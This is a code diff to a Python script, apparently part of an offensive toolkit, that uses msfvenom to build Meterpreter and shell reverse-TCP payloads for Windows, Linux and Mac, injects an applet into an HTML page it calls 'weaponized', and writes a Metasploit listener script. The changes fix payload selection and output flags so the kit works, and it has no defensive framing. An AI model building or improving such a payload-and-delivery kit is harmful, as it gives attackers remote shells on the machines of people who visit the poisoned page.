@@ -12,7 +12,7 @@ import getopt
 
 WINDOWS_DEFAULT = 'windows/meterpreter/reverse_tcp'
 LINUX_DEFAULT = 'linux/x86/meterpreter/reverse_tcp'
-OSX_DEFAULT = 'osx/x64/shell_reverse_tcp'
+OSX_DEFAULT = 'osx/x86/shell_reverse_tcp'
 
 WINDOWS_PORT = 3000
 LINUX_PORT = 3001
@@ -79,10 +79,14 @@ if __name__ == '__main__':
     elif opt == '-m':
       osx = arg
 
-  os.system('msfvenom -p {payload} -f exe LHOST={ip} PORT={port} > {output}'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
-  os.system('msfvenom -p {payload} -f elf LHOST={ip} PORT={port} > {output}'.format(payload=windows, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
-  os.system('msfvenom -p {payload} -f elf LHOST={ip} PORT={port} > {output}'.format(payload=windows, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
+  print 'Generating Windows payload...'
+  os.system('msfvenom -p {payload} -f exe -o {output} LHOST={ip} PORT={port}'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
+  print 'Generating Linux payload...'
+  os.system('msfvenom -p {payload} -f elf -o {output} LHOST={ip} PORT={port}'.format(payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
+  print 'Generating Mac OS X payload...'
+  os.system('msfvenom -p {payload} -f elf -o {output} LHOST={ip} PORT={port}'.format(payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
 
+  print 'Weaponizing html...'
   shutil.copy('applet.jar', 'output')
 
   with open(html_filename, 'r') as html_infile:
@@ -92,6 +96,7 @@ if __name__ == '__main__':
       weaponized_html = re.sub('</body>', applet_code + '\n</body>', html)
       html_outfile.write(weaponized_html)
 
+  print 'Creating listener resource script...'
   with open(os.path.join('output', 'listeners.rc'), 'w') as resource_file:
     resource_file.write("""\
 use exploit/multi/handler
